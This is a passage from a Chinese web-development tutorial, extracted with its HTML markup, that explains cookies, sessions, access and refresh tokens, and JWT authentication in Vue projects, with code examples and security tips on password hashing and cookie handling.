<span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token number">2019</span><span class="token punctuation">,</span><span class="token number">03</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUTCString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// window object</span>
window<span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token string">'30d'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p>单个name设置</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//不写过期时间，默认为1天过期</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">&quot;user_session&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;25j_7Sl6xDq2Kc3ym0fmrSSk2xV2XkUkX&quot;</span><span class="token punctuation">)</span>

<span class="token comment">// 1天过期，忽略大小写</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">&quot;user_session&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;25j_7Sl6xDq2Kc3ym0fmrSSk2xV2XkUkX&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;1d&quot;</span><span class="token punctuation">)</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">&quot;user_session&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;25j_7Sl6xDq2Kc3ym0fmrSSk2xV2XkUkX&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;1D&quot;</span><span class="token punctuation">)</span>

<span class="token comment">// 以秒为单位，设置1天过去</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">&quot;user_session&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;25j_7Sl6xDq2Kc3ym0fmrSSk2xV2XkUkX&quot;</span><span class="token punctuation">,</span><span class="token number">60</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">24</span><span class="token punctuation">)</span>

<span class="token comment">// 填写Date对象，明确指定过期时间</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">&quot;user_session&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;25j_7Sl6xDq2Kc3ym0fmrSSk2xV2XkUkX&quot;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token number">2017</span><span class="token punctuation">,</span> <span class="token number">03</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment">// 填写一个时间字符串，指定过期时间</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">&quot;user_session&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;25j_7Sl6xDq2Kc3ym0fmrSSk2xV2XkUkX&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Sat, 13 Mar 2017 12:25:57 GMT&quot;</span><span class="token punctuation">)</span>

<span class="token comment">//浏览器会话结束时过期</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">&quot;default_unit_second&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;input_value&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;0&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token comment">//永不过期</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$cookies<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">&quot;default_unit_second&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;input_value&quot;</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h4 id="发送给后端"><a href="#发送给后端" class="header-anchor">#</a> 发送给后端</h4> <p>只需要在main.js中写这三行代码即可</p> <p>import axios from 'axios'</p> <p>axios.defaults.withCredentials=true;//让ajax携带cookie</p> <p>Vue.prototype.$axios = axios;</p> <p>如果cookie携带不过去的话，请求响应的时候他会报错显示登陆过期的呦！！！</p> <p>顺便说一下原生js携带cookie的方法：</p> <p>xhrFields: {</p> <p>withCredentials: true</p> <p>},</p> <p>当我们使用vue请求的时候，我们会发现请求头中没有携带cookie传给后台，我们可以在请求时添加如下代码：</p> <p>vue.http.options.xhr = { withCredentials: true}; 的作用就是允许跨域请求携带cookie做身份认证的；</p> <p>vue.http.options.emulateJSON = true; 的作用是如果web服务器无法处理 application/json的请求，我们可以启用 emulateJSON 选项；</p> <p>启用该选项后请求会以application/x-www-form-urlencoded 作为MIME type, 和普通的html表单一样。 加上如下代码，get请求返回的代码会</p> <p>携带cookie，但是post不会；</p> <p>为了方便，我们这边是封装了一个get请求，只要在get请求添加参数 { credentials: true } 即可使用;</p> <h3 id="什么是-session"><a href="#什么是-session" class="header-anchor">#</a> 什么是 Session</h3> <ul><li><p><strong>session 是另一种记录服务器和客户端会话状态的机制</strong></p></li> <li><p><strong>session 是基于 cookie 实现的，session 存储在服务器端，sessionId 会被存储到客户端的cookie 中</strong></p></li> <li><p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/16f523a04d0b3cf5~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="session.png"></p></li> <li><p>session 认证流程：</p> <ul><li>用户第一次请求服务器的时候，服务器根据用户提交的相关信息，创建对应的 Session</li> <li>请求返回时将此 Session 的唯一标识信息 SessionID 返回给浏览器</li> <li>浏览器接收到服务器返回的 SessionID 信息后，会将此信息存入到 Cookie 中，同时 Cookie 记录此 SessionID 属于哪个域名</li> <li>当用户第二次访问服务器的时候，请求会自动判断此域名下是否存在 Cookie 信息，如果存在自动将 Cookie 信息也发送给服务端，服务端会从 Cookie 中获取 SessionID，再根据 SessionID 查找对应的 Session 信息，如果没有找到说明用户没有登录或者登录失效，如果找到 Session 证明用户已经登录可执行后面操作。</li></ul></li></ul> <p>根据以上流程可知，<strong>SessionID 是连接 Cookie 和 Session 的一道桥梁</strong>，大部分系统也是根据此原理来验证用户登录状态。</p> <h4 id="vue设置session"><a href="#vue设置session" class="header-anchor">#</a> vue设置session</h4> <p>1.npm 安装  vue-session</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>npm install vue<span class="token operator">-</span>session
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>2.在main.js中引入</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">import</span> VueSession <span class="token keyword">from</span> <span class="token string">'vue-session'</span>
Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>VueSession<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>3.使用</p> <div class="language-kotlin line-numbers-mode"><pre class="language-kotlin"><code> <span class="token keyword">this</span><span class="token punctuation">.</span>$session<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">&quot;key&quot;</span></span><span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//存session</span>
 <span class="token keyword">this</span><span class="token punctuation">.</span>$session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string-literal singleline"><span class="token string">&quot;key&quot;</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//获取session</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="cookie-和-session-的区别"><a href="#cookie-和-session-的区别" class="header-anchor">#</a> Cookie 和 Session 的区别</h3> <ul><li><strong>安全性：</strong> Session 比 Cookie 安全，Session 是存储在服务器端的，Cookie 是存储在客户端的。</li> <li><strong>存取值的类型不同</strong>：Cookie 只支持存字符串数据，想要设置其他类型的数据，需要将其转换成字符串，Session 可以存任意数据类型。</li> <li><strong>有效期不同：</strong> Cookie 可设置为长时间保持，比如我们经常使用的默认登录功能，Session 一般失效时间较短，客户端关闭（默认情况下）或者 Session 超时都会失效。</li> <li><strong>存储大小不同：</strong> 单个 Cookie 保存的数据不能超过 4K，Session 可存储数据远高于 Cookie，但是当访问量过多，会占用过多的服务器资源。</li></ul> <h3 id="什么是-token-令牌"><a href="#什么是-token-令牌" class="header-anchor">#</a> 什么是 Token（令牌）</h3> <h4 id="acesss-token"><a href="#acesss-token" class="header-anchor">#</a> Acesss Token</h4> <ul><li><strong>访问资源接口（API）时所需要的资源凭证</strong></li> <li><strong>简单 token 的组成：</strong> uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token 的前几位以哈希算法压缩成的一定长度的十六进制字符串）</li> <li>特点：
<ul><li><strong>服务端无状态化、可扩展性好</strong></li> <li><strong>支持移动端设备</strong></li> <li>安全</li> <li>支持跨程序调用</li></ul></li> <li><strong>token 的身份验证流程：</strong></li></ul> <p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/16f523a04d9c745f~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p> <ol><li>客户端使用用户名跟密码请求登录</li> <li>服务端收到请求，去验证用户名与密码</li> <li>验证成功后，服务端会签发一个 token 并把这个 token 发送给客户端</li> <li>客户端收到 token 以后，会把它存储起来，比如放在 cookie 里或者 localStorage 里</li> <li>客户端每次向服务端请求资源的时候需要带着服务端签发的 token</li> <li>服务端收到请求，然后去验证客户端请求里面带着的 token ，如果验证成功，就向客户端返回请求的数据</li></ol> <ul><li><strong>每一次请求都需要携带 token，需要把 token 放到 HTTP 的 Header 里</strong></li> <li><strong>基于 token 的用户认证是一种服务端无状态的认证方式，服务端不用存放 token 数据。用解析 token 的计算时间换取 session 的存储空间，从而减轻服务器的压力，减少频繁的查询数据库</strong></li> <li><strong>token 完全由应用管理，所以它可以避开同源策略</strong></li></ul> <h4 id="refresh-token"><a href="#refresh-token" class="header-anchor">#</a> Refresh Token</h4> <ul><li>另外一种 token——refresh token</li> <li>refresh token 是专用于刷新 access token 的 token。如果没有 refresh token，也可以刷新 access token，但每次刷新都要用户输入登录用户名与密码，会很麻烦。有了 refresh token，可以减少这个麻烦，客户端直接用 refresh token 去更新 access token，无需用户进行额外的操作。</li></ul> <p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/16f523a04d1c887b~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p> <ul><li>Access Token 的有效期比较短，当 Acesss Token 由于过期而失效时，使用 Refresh Token 就可以获取到新的 Token，如果 Refresh Token 也失效了，用户就只能重新登录了。</li> <li>Refresh Token 及过期时间是存储在服务器的数据库中，只有在申请新的 Acesss Token 时才会验证，不会对业务接口响应时间造成影响，也不需要向 Session 一样一直保持在内存中以应对大量的请求。</li></ul> <h3 id="token-和-session-的区别"><a href="#token-和-session-的区别" class="header-anchor">#</a> Token 和 Session 的区别</h3> <ul><li>Session 是一种<strong>记录服务器和客户端会话状态的机制，使服务端有状态化，可以记录会话信息</strong>。而 Token 是<strong>令牌</strong>，<strong>访问资源接口（API）时所需要的资源凭证</strong>。Token <strong>使服务端无状态化，不会存储会话信息。</strong></li> <li>Session 和 Token 并不矛盾，作为身份认证 Token 安全性比 Session 好，因为每一个请求都有签名还能防止监听以及重放攻击，而 Session 就必须依赖链路层来保障通讯安全了。<strong>如果你需要实现有状态的会话，仍然可以增加 Session 来在服务器端保存一些状态。</strong></li> <li>所谓 Session 认证只是简单的把 User 信息存储到 Session 里，因为 SessionID 的不可预测性，暂且认为是安全的。而 Token ，如果指的是 OAuth Token 或类似的机制的话，提供的是 认证 和 授权 ，认证是针对用户，授权是针对 App 。其目的是让某 App 有权利访问某用户的信息。这里的 Token 是唯一的。不可以转移到其它 App上，也不可以转到其它用户上。Session 只提供一种简单的认证，即只要有此 SessionID ，即认为有此 User 的全部权利。是需要严格保密的，这个数据应该只保存在站方，不应该共享给其它网站或者第三方 App。所以简单来说：<strong>如果你的用户数据可能需要和第三方共享，或者允许第三方调用 API 接口，用 Token 。如果永远只是自己的网站，自己的 App，用什么就无所谓了。</strong></li></ul> <h3 id="什么是-jwt"><a href="#什么是-jwt" class="header-anchor">#</a> 什么是 JWT</h3> <ul><li>JSON Web Token（简称 JWT）是目前最流行的<strong>跨域认证</strong>解决方案。</li> <li>是一种<strong>认证授权机制</strong>。</li> <li>JWT 是为了在网络应用环境间<strong>传递声明</strong>而执行的一种基于 JSON 的开放标准（<a href="https://link.juejin.cn?target=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc7519" target="_blank" rel="noopener noreferrer">RFC 7519<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>）。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。比如用在用户登录上。</li> <li>可以使用 HMAC 算法或者是 RSA 的公/私秘钥对 JWT 进行签名。因为数字签名的存在，这些传递的信息是可信的。</li> <li><strong>阮一峰老师的 <a href="https://link.juejin.cn?target=http%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2018%2F07%2Fjson_web_token-tutorial.html" target="_blank" rel="noopener noreferrer">JSON Web Token 入门教程<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 讲的非常通俗易懂，这里就不再班门弄斧了</strong></li></ul> <h4 id="生成-jwt"><a href="#生成-jwt" class="header-anchor">#</a> 生成 JWT</h4> <p><a href="https://link.juejin.cn?target=https%3A%2F%2Fjwt.io%2F" target="_blank" rel="noopener noreferrer">jwt.io/<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jsonwebtoken.io%2F" target="_blank" rel="noopener noreferrer">www.jsonwebtoken.io/<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <h4 id="jwt-的原理"><a href="#jwt-的原理" class="header-anchor">#</a> JWT 的原理</h4> <p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/16f523a04e881087~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="img"></p> <ul><li>JWT 认证流程：
<ul><li>用户输入用户名/密码登录，服务端认证成功后，会返回给客户端一个 JWT</li> <li>客户端将 token 保存到本地（通常使用 localstorage，也可以使用 cookie）</li> <li>当用户希望访问一个受保护的路由或者资源的时候，需要请求头的 Authorization 字段中使用Bearer 模式添加 JWT，其内容看起来是下面这样</li></ul></li></ul> <div class="language-makefile line-numbers-mode"><pre class="language-makefile"><code><span class="token target symbol">Authorization</span><span class="token punctuation">:</span> Bearer &lt;token&gt;
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ul><li>服务端的保护路由将会检查请求头 Authorization 中的 JWT 信息，如果合法，则允许用户的行为</li> <li>因为 JWT 是自包含的（内部包含了一些会话信息），因此减少了需要查询数据库的需要</li> <li>因为 JWT 并不使用 Cookie 的，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS）</li> <li>因为用户的状态不再存储在服务端的内存中，所以这是一种无状态的认证机制</li></ul> <h4 id="jwt-的使用方式"><a href="#jwt-的使用方式" class="header-anchor">#</a> JWT 的使用方式</h4> <ul><li>客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</li></ul> <h4 id="方式一"><a href="#方式一" class="header-anchor">#</a> 方式一</h4> <ul><li><p>当用户希望访问一个受保护的路由或者资源的时候，可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求头信息的 Authorization 字段里，使用 Bearer 模式添加 JWT。</p> <div class="language-vbnet line-numbers-mode"><pre class="language-vbnet"><code><span class="token keyword">GET</span> <span class="token operator">/</span>calendar<span class="token operator">/</span>v1<span class="token operator">/</span>events
Host<span class="token punctuation">:</span> api.example.<span class="token keyword">com</span>
Authorization<span class="token punctuation">:</span> Bearer <span class="token operator">&lt;</span>token<span class="token operator">&gt;</span>
复制代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><ul><li>用户的状态不会存储在服务端的内存中，这是一种 <strong>无状态的认证机制</strong></li> <li>服务端的保护路由将会检查请求头 Authorization 中的 JWT 信息，如果合法，则允许用户的行为。</li> <li>由于 JWT 是自包含的，因此减少了需要查询数据库的需要</li> <li>JWT 的这些特性使得我们可以完全依赖其无状态的特性提供数据 API 服务，甚至是创建一个下载流服务。</li> <li>因为 JWT 并不使用 Cookie ，所以你可以使用任何域名提供你的 API 服务而<strong>不需要担心跨域资源共享问题</strong>（CORS）</li></ul></li></ul> <h4 id="方式二"><a href="#方式二" class="header-anchor">#</a> 方式二</h4> <ul><li>跨域的时候，可以把 JWT 放在 POST 请求的数据体里。</li></ul> <h4 id="方式三"><a href="#方式三" class="header-anchor">#</a> 方式三</h4> <ul><li>通过 URL 传输</li></ul> <div class="language-ini line-numbers-mode"><pre class="language-ini"><code><span class="token key attr-name">http://www.example.com/user?token</span><span class="token punctuation">=</span><span class="token value attr-value">xxx</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="token-和-jwt-的区别"><a href="#token-和-jwt-的区别" class="header-anchor">#</a> Token 和 JWT 的区别</h3> <p><strong>相同：</strong></p> <ul><li>都是访问资源的令牌</li> <li>都可以记录用户的信息</li> <li>都是使服务端无状态化</li> <li>都是只有验证成功后，客户端才能访问服务端上受保护的资源</li></ul> <p><strong>区别：</strong></p> <ul><li>Token：服务端验证客户端发送过来的 Token 时，还需要查询数据库获取用户信息，然后验证 Token 是否有效。</li> <li>JWT： 将 Token 和 Payload 加密后存储于客户端，服务端只需要使用密钥解密进行校验（校验也是 JWT 自己实现的）即可，不需要查询或者减少查询数据库，因为 JWT 自包含了用户信息和加密的数据。</li></ul> <h3 id="常见的前后端鉴权方式"><a href="#常见的前后端鉴权方式" class="header-anchor">#</a> 常见的前后端鉴权方式</h3> <ol><li>Session-Cookie</li> <li>Token 验证（包括 JWT，SSO）</li> <li>OAuth2.0（开放授权）</li></ol> <h3 id="常见的加密算法"><a href="#常见的加密算法" class="header-anchor">#</a> 常见的加密算法</h3> <p><img src="https://cdn.jsdelivr.net/gh/KeXiaoZhan/Images/16f523a04f17f2fc~tplv-t2oaga2asx-zoom-in-crop-mark:3024:0:0:0.awebp" alt="image.png"></p> <ul><li>哈希算法(Hash Algorithm)又称散列算法、散列函数、哈希函数，是一种从任何一种数据中创建小的数字“指纹”的方法。哈希算法将数据重新打乱混合，重新创建一个哈希值。</li> <li>哈希算法主要用来保障数据真实性(即完整性)，即发信人将原始消息和哈希值一起发送，收信人通过相同的哈希函数来校验原始数据是否真实。</li> <li>哈希算法通常有以下几个特点：
<ul><li>正像快速：原始数据可以快速计算出哈希值</li> <li>逆向困难：通过哈希值基本不可能推导出原始数据</li> <li>输入敏感：原始数据只要有一点变动，得到的哈希值差别很大</li> <li>冲突避免：很难找到不同的原始数据得到相同的哈希值，宇宙中原子数大约在 10 的 60 次方到 80 次方之间，所以 2 的 256 次方有足够的空间容纳所有的可能，算法好的情况下冲突碰撞的概率很低：
<ul><li>2 的 128 次方为 340282366920938463463374607431768211456，也就是 10 的 39 次方级别</li> <li>2 的 160 次方为 1.4615016373309029182036848327163e+48，也就是 10 的 48 次方级别</li> <li>2 的 256 次方为 1.1579208923731619542357098500869 × 10 的 77 次方，也就是 10 的 77 次方</li></ul></li></ul></li></ul> <p><strong>注意：</strong></p> <ol><li>以上不能保证数据被恶意篡改，原始数据和哈希值都可能被恶意篡改，要保证不被篡改，可以使用RSA 公钥私钥方案，再配合哈希值。</li> <li>哈希算法主要用来防止计算机传输过程中的错误，早期计算机通过前 7 位数据第 8 位奇偶校验码来保障（12.5% 的浪费效率低），对于一段数据或文件，通过哈希算法生成 128bit 或者 256bit 的哈希值，如果校验有问题就要求重传。</li></ol> <h2 id="常见问题"><a href="#常见问题" class="header-anchor">#</a> 常见问题</h2> <h3 id="使用-cookie-时需要考虑的问题"><a href="#使用-cookie-时需要考虑的问题" class="header-anchor">#</a> 使用 cookie 时需要考虑的问题</h3> <ul><li>因为存储在客户端，容易被客户端篡改，使用前需要验证合法性</li> <li>不要存储敏感数据，比如用户密码，账户余额</li> <li>使用 httpOnly 在一定程度上提高安全性</li> <li>尽量减少 cookie 的体积，能存储的数据量不能超过 4kb</li> <li>设置正确的 domain 和 path，减少数据传输</li> <li><strong>cookie 无法跨域</strong></li> <li>一个浏览器针对一个网站最多存 20 个Cookie，浏览器一般只允许存放 300 个Cookie</li> <li><strong>移动端对 cookie 的支持不是很好，而 session 需要基于 cookie 实现，所以移动端常用的是 token</strong></li></ul> <h3 id="使用-session-时需要考虑的问题"><a href="#使用-session-时需要考虑的问题" class="header-anchor">#</a> 使用 session 时需要考虑的问题</h3> <ul><li>将 session 存储在服务器里面，当用户同时在线量比较多时，这些 session 会占据较多的内存，需要在服务端定期的去清理过期的 session</li> <li>当网站采用<strong>集群部署</strong>的时候，会遇到多台 web 服务器之间如何做 session 共享的问题。因为 session 是由单个服务器创建的，但是处理用户请求的服务器不一定是那个创建 session 的服务器，那么该服务器就无法拿到之前已经放入到 session 中的登录凭证之类的信息了。</li> <li>当多个应用要共享 session 时，除了以上问题，还会遇到跨域问题，因为不同的应用可能部署的主机不一样，需要在各个应用做好 cookie 跨域的处理。</li> <li><strong>sessionId 是存储在 cookie 中的，假如浏览器禁止 cookie 或不支持 cookie 怎么办？</strong> 一般会把 sessionId 跟在 url 参数后面即重写 url，所以 session 不一定非得需要靠 cookie 实现</li> <li><strong>移动端对 cookie 的支持不是很好，而 session 需要基于 cookie 实现，所以移动端常用的是 token</strong></li></ul> <h3 id="使用-token-时需要考虑的问题"><a href="#使用-token-时需要考虑的问题" class="header-anchor">#</a> 使用 token 时需要考虑的问题</h3> <ul><li>如果你认为用数据库来存储 token 会导致查询时间太长，可以选择放在内存当中。比如 redis 很适合你对 token 查询的需求。</li> <li><strong>token 完全由应用管理，所以它可以避开同源策略</strong></li> <li><font color="red" size="3"><strong>token 可以避免 CSRF 攻击(因为不需要 cookie 了)</strong></font></li> <li><strong>移动端对 cookie 的支持不是很好，而 session 需要基于 cookie 实现，所以移动端常用的是 token</strong></li></ul> <h3 id="使用-jwt-时需要考虑的问题"><a href="#使用-jwt-时需要考虑的问题" class="header-anchor">#</a> 使用 JWT 时需要考虑的问题</h3> <ul><li>因为 JWT 并不依赖 Cookie 的，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS）</li> <li>JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。</li> <li>JWT 不加密的情况下，不能将秘密数据写入 JWT。</li> <li>JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</li> <li>JWT 最大的优势是服务器不再需要存储 Session，使得服务器认证鉴权业务可以方便扩展。但这也是 JWT 最大的缺点：由于服务器不需要存储 Session 状态，因此使用过程中无法废弃某个 Token 或者更改 Token 的权限。也就是说一旦 JWT 签发了，到期之前就会始终有效，除非服务器部署额外的逻辑。</li> <li>JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</li> <li>JWT 适合一次性的命令认证，颁发一个有效期极短的 JWT，即使暴露了危险也很小，由于每次操作都会生成新的 JWT，因此也没必要保存 JWT，真正实现无状态。</li> <li>为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</li></ul> <h3 id="使用加密算法时需要考虑的问题"><a href="#使用加密算法时需要考虑的问题" class="header-anchor">#</a> 使用加密算法时需要考虑的问题</h3> <ul><li>绝不要以<strong>明文存储</strong>密码</li> <li><strong>永远使用 哈希算法 来处理密码，绝不要使用 Base64 或其他编码方式来存储密码，这和以明文存储密码是一样的，使用哈希，而不要使用编码</strong>。编码以及加密，都是双向的过程，而密码是保密的，应该只被它的所有者知道， 这个过程必须是单向的。哈希正是用于做这个的，从来没有解哈希这种说法， 但是编码就存在解码，加密就存在解密。</li> <li>绝不要使用弱哈希或已被破解的哈希算法，像 MD5 或 SHA1 ，只使用强密码哈希算法。</li> <li>绝不要以明文形式显示或发送密码，即使是对密码的所有者也应该这样。如果你需要 “忘记密码” 的功能，可以随机生成一个新的 <strong>一次性的</strong>（这点很重要）密码，然后把这个密码发送给用户。</li></ul> <h3 id="分布式架构下-session-共享方案"><a href="#分布式架构下-session-共享方案" class="header-anchor">#</a> 分布式架构下 session 共享方案</h3> <h4 id="_1-session-复制"><a href="#_1-session-复制" class="header-anchor">#</a> 1. session 复制</h4> <ul><li>任何一个服务器上的 session 发生改变（增删改），该节点会把这个 session 的所有内容序列化，然后广播给所有其它节点，不管其他服务器需不需要 session ，以此来保证 session 同步</li></ul> <p><strong>优点：</strong> 可容错，各个服务器间 session 能够实时响应。
